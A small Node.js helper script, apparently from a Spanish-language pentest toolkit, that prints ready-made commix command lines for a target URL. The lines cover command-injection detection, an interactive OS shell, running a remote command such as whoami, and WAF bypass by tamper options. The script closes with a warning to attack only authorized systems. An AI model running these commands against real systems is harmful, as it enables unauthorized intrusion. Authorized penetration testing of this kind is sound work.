#!/usr/bin/env node
/**
 * MFH TOOLS - Commix
 * Categoria: Acceso Inicial
 *
 * Uso: node commix.js --url <url> [--data <post>] [--level 1|2|3] [--os-shell]
 *
 * Autor: FalconMX Security
 */

'use strict';

const CONFIG = { version: '1.0.0', author: 'FalconMX Security' };

function printReport(url, data, level, osShell) {
    console.log('');
    console.log('='.repeat(65));
    console.log('  COMMIX - Command Injection Exploiter');
    console.log('  Target: ' + (url || 'http://target.com/ping?ip=127.0.0.1'));
    if (data) console.log('  POST data: ' + data);
    console.log('  Level: ' + (level || '1'));
    console.log('  OS Shell: ' + (osShell ? 'Si' : 'No'));
    console.log('  Fecha: ' + new Date().toISOString());
    console.log('='.repeat(65));
    console.log('');
    console.log('  [Tool] Commix');
    console.log('    Commix (short for [comm]and [i]njection e[x]ploiter) is an open source penetration testing tool that automates the detection and exploitation of command injection vulnerabilities ');
    console.log('');
    console.log('  [Install]');
    console.log('    sudo apt install commix');
    console.log('    # o');
    console.log('    git clone https://github.com/commixproject/commix.git');
    console.log('');
    var cmd = 'commix --url="' + url + '"';
    if (data) cmd += ' --data="' + data + '"';
    console.log('  [Deteccion basica]');
    console.log('    ' + cmd);
    console.log('');
    console.log('  [Con nivel especifico]');
    console.log('    ' + cmd + ' --level=' + (level || '1'));
    console.log('');
    if (osShell) {
        console.log('  [OS Shell interactivo]');
        console.log('    ' + cmd + ' --os-shell');
        console.log('');
    }
    console.log('  [Ejecutar comando unico]');
    console.log('    ' + cmd + ' --os-cmd="whoami"');
    console.log('');
    console.log('  [Tecnicas de inyeccion]');
    console.log('    --technique=classic    Inyeccion clasica');
    console.log('    --technique=timebased  Basada en tiempo');
    console.log('    --technique=filebased  Basada en archivos');
    console.log('    --technique=semi-blind Semi-blind');
    console.log('');
    console.log('  [Opciones utiles]');
    console.log('    --tamper=base64encode  Bypass de WAF');
    console.log('    -r request.txt         Request de Burp');
    console.log('    --batch                No preguntar');
    console.log('    --random-agent         User agent aleatorio');
    console.log('    --cookie="..."         Cookie de sesion');
    console.log('');
    console.log('-'.repeat(65));
    console.log('  WARN: solo ataca sistemas con autorizacion escrita');
    console.log('-'.repeat(65));
    console.log('');
}

function main() {
    var args = process.argv.slice(2);
    var urlIdx = args.indexOf('--url');
    var dataIdx = args.indexOf('--data');
    var levelIdx = args.indexOf('--level');
    var osShell = args.indexOf('--os-shell') !== -1;

    if (args.length === 0 || urlIdx === -1) {
        console.log('');
        console.log('+------------------------------------------------------+');
        console.log('|  MFH TOOLS - Commix v' + CONFIG.version + '                         |');
        console.log('|  ' + CONFIG.author + '                              |');
        console.log('+------------------------------------------------------+');
        console.log('');
        console.log('  Uso: node commix.js --url <url> [--data <post>] [--level 1|2|3] [--os-shell]');
        console.log('');
        console.log('  Ejemplos:');
        console.log('    node commix.js --url "http://target.com/ping?ip=127.0.0.1"');
        console.log('    node commix.js --url "http://target.com/form" --data "ip=127.0.0.1" --level 3 --os-shell');
        console.log('');
        process.exit(0);
    }

    var url = args[urlIdx + 1];
    var data = dataIdx !== -1 ? args[dataIdx + 1] : '';
    var level = levelIdx !== -1 ? args[levelIdx + 1] : '1';

    console.log('\nGenerando comandos Commix...\n');
    printReport(url, data, level, osShell);
}

main();
